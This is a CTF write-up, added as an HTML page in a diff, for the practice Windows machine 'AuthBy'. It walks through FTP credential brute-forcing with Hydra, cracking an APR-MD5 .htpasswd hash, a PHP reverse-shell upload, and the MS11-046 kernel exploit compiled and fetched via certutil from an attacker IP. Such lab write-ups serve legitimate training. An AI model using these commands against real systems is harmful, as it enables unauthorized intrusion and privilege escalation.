@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AuthBy &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>AuthBy</h1>
+    <div class="meta">Target: <code>192.168.180.46</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">FTP</span><span class="tag">BasicAuth</span><span class="tag">HashCracking</span><span class="tag">SeImpersonate</span><span class="tag">MS11-046</span><span class="tag">KernelExploit</span><span class="tag">x86</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#anonymous-ftp">Anonymous FTP</a><a class="lvl3" href="#brute-forcing-ftp-with-default-credentials">Brute-Forcing FTP with Default Credentials</a><a class="lvl3" href="#looting-the-admin-ftp-session">Looting the Admin FTP Session</a><a class="lvl3" href="#cracking-the-apr-md5-hash">Cracking the APR-MD5 Hash</a><a class="lvl3" href="#php-shell-via-http-upload">PHP Shell via HTTP Upload</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#seimpersonate-dead-end-on-x86">SeImpersonate, Dead End on x86</a><a class="lvl3" href="#ms11-046-kernel-exploit-afd-sys">MS11-046 Kernel Exploit (afd.sys)</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>AuthBy is a Windows machine built around a layered credential chain: anonymous FTP exposes an admin interface, the admin FTP account reveals HTTP basic-auth credentials hidden in a <code>.htpasswd</code> file, and cracking that hash unlocks a PHP upload endpoint. The privilege escalation path drops Juicy Potato early because the box is 32-bit Windows Server 2008 R2, then pivots to a kernel exploit (MS11-046) targeting <code>afd.sys</code> for a direct SYSTEM shell.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        zFTPServer 6.0 build 2011-10-17
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+242/tcp  open  http       Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
+|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
+3145/tcp open  zftp-admin zFTPServer admin
+3389/tcp open  ssl/ms-wbt-server
+</code></pre>
+<p>Three things stand out immediately: anonymous FTP is open, port 242 demands HTTP basic auth, and the RDP banner fingerprints the OS as Windows Server 2008 (Product_Version: 6.0.6001). That version matters a lot for the escalation later.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="anonymous-ftp">Anonymous FTP</h3>
+<p>The anonymous account logs in fine but can't download any files from the root:</p>
+<pre><code class="language-sh">ftp 192.168.180.46
+Name: anonymous
+230 User logged in, proceed.
+</code></pre>
+<p>The root directory holds the zFTPServer application itself, settings files, and an <code>accounts/</code> folder, but read permissions are denied.</p>
+<blockquote>
+<p><strong>Why poke at default FTP credentials anyway:</strong> anonymous access on FTP servers typically reveals the share layout, which tells you what services the application is running and what a privileged account might see differently. The <code>accounts/</code> directory listing here signals that account files are stored on disk, worth brute-forcing the login.</p>
+</blockquote>
+<h3 id="brute-forcing-ftp-with-default-credentials">Brute-Forcing FTP with Default Credentials</h3>
+<p>Hydra against SecLists' FTP default credential list finds working logins immediately:</p>
+<pre><code class="language-sh">hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.180.46
+[21][ftp] host: 192.168.180.46   login: admin   password: admin
+</code></pre>
+<p>Credentials:</p>
+<pre><code>admin : admin
+</code></pre>
+<h3 id="looting-the-admin-ftp-session">Looting the Admin FTP Session</h3>
+<p>With <code>admin:admin</code> the same root directory now exposes three extra files:</p>
+<pre><code class="language-sh">-r--r--r--   1 root     root           76 Nov 08  2011 index.php
+-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
+-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
+</code></pre>
+<p><code>.htpasswd</code> contains:</p>
+<pre><code>offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
+</code></pre>
+<h3 id="cracking-the-apr-md5-hash">Cracking the APR-MD5 Hash</h3>
+<p><code>hash-identifier</code> confirms this is an APR-MD5 (<code>$apr1$</code>) hash, the variant Apache uses for <code>.htpasswd</code> files. John cracks it against rockyou in under a second:</p>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+elite            (?)
+</code></pre>
+<p>Credentials for the web interface:</p>
+<pre><code>offsec : ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>APR-MD5 vs regular MD5:</strong> the <code>$apr1$</code> prefix marks a salted, iterated variant of MD5 designed for password storage. It's much slower than a raw MD5 but still nowhere near bcrypt or sha512crypt, rockyou tears through it at ~253k p/s.</p>
+</blockquote>
+<h3 id="php-shell-via-http-upload">PHP Shell via HTTP Upload</h3>
+<p>The basic-auth protected page at <code>http://192.168.180.46:242/</code> serves the same text as <code>index.php</code> downloaded over FTP. The <code>.htaccess</code> confirms <code>.php</code> files execute, and <code>index.php</code> reveals an upload path. I uploaded the Ivan Sincek PHP reverse shell and triggered it:</p>
+<pre><code>http://192.168.180.46:242/shell2.php
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [...] from (UNKNOWN) [192.168.180.46] 49157
+C:\wamp\bin\apache\Apache2.2.21&gt; whoami
+livda\apache
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-powershell">C:\Users\apache\Desktop&gt; type local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="seimpersonate-dead-end-on-x86">SeImpersonate, Dead End on x86</h3>
+<p><code>whoami /priv</code> shows SeImpersonatePrivilege enabled. The obvious choice is a Potato exploit, but:</p>
+<pre><code class="language-sh">systeminfo
+System Type: X86-based PC
+</code></pre>
+<p>This is a 32-bit machine. Print Spoofer doesn't support x86, and several Juicy Potato CLSID attempts either fail to connect to the COM server or don't produce usable output. Even when the WUAUSERV CLSID (<code>{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</code>) authenticates correctly, the extremely restricted environment on this box prevents the process creation step from working.</p>
+<blockquote>
+<p><strong>CLSID trial and error:</strong> Juicy Potato needs a DCOM server running as SYSTEM that the exploit can coerce into creating a token. The right CLSID depends on the exact OS version and which services are running. The full list per OS is at <code>github.com/ohpe/juicy-potato/tree/master/CLSID</code>, worth bookmarking for every old Windows box you hit.</p>
+</blockquote>
+<h3 id="ms11-046-kernel-exploit-afd-sys">MS11-046 Kernel Exploit (<code>afd.sys</code>)</h3>
+<p>Server 2008 R2 SP1 (build 6001) is vulnerable to MS11-046, a local privilege escalation in the Windows Ancillary Function Driver (<code>afd.sys</code>). Searchsploit has a pre-written C exploit:</p>
+<pre><code class="language-sh">searchsploit -m 40564
+i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32
+</code></pre>
+<p>The cross-compiler flag <code>i686</code> produces a 32-bit PE, matching the target architecture. Transferring and running:</p>
+<pre><code class="language-powershell">certutil.exe -urlcache -f http://192.168.45.244/pwn.exe pwn.exe
+.\pwn.exe
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<pre><code class="language-powershell">c:\Windows\System32&gt; whoami
+nt authority\system
+</code></pre>
+<pre><code class="language-powershell">c:\Users\Administrator\Desktop&gt; type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Layered default credentials are a real attack chain.</strong> FTP anonymous access led to admin FTP, which leaked HTTP credentials, which opened a PHP upload endpoint. Each step was a default or trivially weak secret.</li>
+<li><strong>Architecture determines your privesc toolkit.</strong> SeImpersonate on an x86 box rules out most modern potato variants. Check <code>System Type</code> in <code>systeminfo</code> before reaching for GodPotato or PrintSpoofer.</li>
+<li><strong>Old kernels are free SYSTEM.</strong> Server 2008 R2 with a public build number is a searchsploit query away from a kernel exploit. MS11-046 compiles cleanly with mingw and requires no interaction.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
